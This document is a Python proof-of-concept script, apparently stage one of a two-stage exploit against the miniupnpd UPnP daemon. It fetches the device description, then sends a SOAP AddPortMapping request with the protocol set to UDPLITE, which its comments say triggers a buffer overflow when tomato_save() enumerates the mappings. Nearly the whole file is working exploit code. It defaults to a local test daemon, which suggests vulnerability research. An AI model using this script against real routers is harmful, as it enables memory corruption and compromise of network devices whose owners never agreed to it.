#!/usr/bin/env python3
"""
send_soap.py
Sends a UPnP SOAP AddPortMapping request with NewProtocol=UDPLITE
to a locally running miniupnpd instance.

This is stage 1 of the exploit: create the UDPLITE mapping.
The mapping is stored in the firewall rules. The overflow fires
in stage 2 when tomato_save() enumerates the mappings.

Usage:
    python3 send_soap.py [host] [port]
    python3 send_soap.py              # defaults: 127.0.0.1:5555
"""

import sys
import socket
import urllib.request
import urllib.error

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5555

# First, discover the control URL from the device description
def get_control_url(host, port):
    try:
        url = f"http://{host}:{port}/rootDesc.xml"
        print(f"[*] Fetching device description from {url}")
        with urllib.request.urlopen(url, timeout=5) as r:
            body = r.read().decode()
        # Find the WANIPConnection controlURL
        import re
        m = re.search(r'<controlURL>([^<]+)</controlURL>', body)
        if m:
            path = m.group(1)
            print(f"[*] Found controlURL: {path}")
            return f"http://{host}:{port}{path}"
        print("[-] Could not find controlURL in device description")
        print("    Device description:")
        print(body[:500])
        return None
    except Exception as e:
        print(f"[-] Failed to get device description: {e}")
        return None

def send_add_port_mapping(control_url, protocol="UDPLITE"):
    """Send AddPortMapping SOAP request with the given protocol."""

    soap_body = f"""<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
            s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewRemoteHost></NewRemoteHost>
      <NewExternalPort>54321</NewExternalPort>
      <NewProtocol>{protocol}</NewProtocol>
      <NewInternalPort>54321</NewInternalPort>
      <NewInternalClient>127.0.0.1</NewInternalClient>
      <NewEnabled>1</NewEnabled>
      <NewPortMappingDescription>TestMapping_{protocol}</NewPortMappingDescription>
      <NewLeaseDuration>0</NewLeaseDuration>
    </u:AddPortMapping>
  </s:Body>
</s:Envelope>"""

    headers = {
        "Content-Type": 'text/xml; charset="utf-8"',
        "SOAPAction": '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"',
        "Content-Length": str(len(soap_body.encode())),
    }

    print(f"\n[*] Sending AddPortMapping with NewProtocol={protocol}")
    print(f"[*] Target: {control_url}")

    req = urllib.request.Request(control_url, soap_body.encode(), headers)
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            response = r.read().decode()
            print(f"[+] Success (HTTP {r.status})")
            print(f"    Response: {response[:200]}")
            return True
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        print(f"[-] HTTP {e.code}: {e.reason}")
        print(f"    Response: {body[:300]}")
        return False
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return False

if __name__ == "__main__":
    print("miniupnpd UDPLITE SOAP PoC — Stage 1: Create UDPLITE mapping")
    print("=" * 60)

    control_url = get_control_url(HOST, PORT)
    if not control_url:
        print("\n[!] Could not get control URL.")
        print("    Make sure miniupnpd is running: sudo ./run_daemon.sh")
        sys.exit(1)

    # Send a safe TCP mapping first as a control
    print("\n--- Control: Adding TCP mapping (safe) ---")
    send_add_port_mapping(control_url, protocol="TCP")

    # Now send the UDPLITE mapping that will cause the overflow on enumeration
    print("\n--- Exploit: Adding UDPLITE mapping (triggers overflow on save) ---")
    ok = send_add_port_mapping(control_url, protocol="UDPLITE")

    if ok:
        print("\n[+] UDPLITE mapping created.")
        print("    Stage 2: run ./trigger_save.sh to fire tomato_save()")
        print("             and observe corruption in /etc/upnp/data")
    else:
        print("\n[!] Mapping creation failed.")
        print("    Check daemon logs and ensure UDPLITE is accepted.")
